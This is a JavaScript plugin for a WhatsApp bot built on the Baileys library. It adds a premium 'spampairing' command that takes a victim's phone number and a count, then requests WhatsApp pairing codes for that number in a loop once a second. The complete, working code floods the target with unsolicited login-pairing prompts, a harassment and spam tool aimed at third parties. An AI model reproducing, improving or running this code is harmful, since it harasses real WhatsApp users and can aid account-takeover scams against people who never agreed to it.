//Simple Base Botz
// • Credits : wa.me/6288989721627 [ manzxy ]
// • Feature : tools/spampairing


const {
    makeWASocket,
    useMultiFileAuthState,
    makeCacheableSignalKeyStore,
} = require("baileys");
const {
    Boom
} = require("@hapi/boom");
const NodeCache = require("node-cache");
const Pino = require("pino");
const chalk = require("chalk");

function no(number) {
    return number.replace(/\D/g, "").replace(/^0/, "62");
}

let spamPairing = async (m, {
    conn,
    text
}) => {
    try {
        let target;
        if (m.quoted) {
            target = no(m.quoted.sender);
        } else if (text) {
            target = no(text.split(" ")[0]);
        }

        if (!target) return m.reply(`> ❌ *Harap masukkan nomor yang valid!*`);

        let jumlah = parseInt(text.split(" ")[1]) || 20;

        if (isNaN(jumlah) || jumlah <= 0) return m.reply(`> ❌ *Jumlah harus berupa angka yang valid!*`);

        let dir = `tmp/${m.sender.split("@")[0]}`;
        const {
            state,
            saveCreds
        } = await useMultiFileAuthState(dir);
        const cache = new NodeCache();

        m.reply(
            `> *– 乂 Memulai Proses Spam!*\n\n` +
            `> 📞 *Nomor:* @${target}\n` +
            `> 🔢 *Total:* ${jumlah}`
        );

        const config = {
            logger: Pino({
                level: "fatal"
            }).child({
                level: "fatal"
            }),
            printQRInTerminal: false,
            mobile: false,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, Pino({
                    level: "fatal"
                }).child({
                    level: "fatal"
                })),
            },
            version: [2, 3e3, 1015901307],
            browser: ["Ubuntu", "Edge", "110.0.1587.56"],
            markOnlineOnConnect: true,
            generateHighQualityLinkPreview: true,
            msgRetryCounterCache: cache,
            defaultQueryTimeoutMs: undefined,
        };
        const sock = makeWASocket(config);

        setTimeout(async () => {
            for (let i = 0; i < jumlah; i++) {
                try {
                    let retries = i + 1;
                    let anu = global.pairing;
                    let pairing = await conn.requestPairingCode(target, anu);
                    let code = pairing?.match(/.{1,4}/g)?.join("-") || pairing;

                    console.log(
                        `> ${chalk.yellow.bold("[" + retries + "/" + jumlah + "]")} ` +
                        `😛 Kode pairing anda: ${code}`
                    );
                } catch (err) {
                    console.log(`> ❌ Gagal mendapatkan pairing code: ${err.message}`);
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }, 3000);
    } catch (err) {
        m.reply(`> ❌ *Terjadi kesalahan: ${err.message}*`);
    }
};

spamPairing.help = ['spampairing', 'pairing'];
spamPairing.command = ['spampairing', 'pairing'];
spamPairing.tags = ['tools'];
spamPairing.premium = true;
module.exports = spamPairing;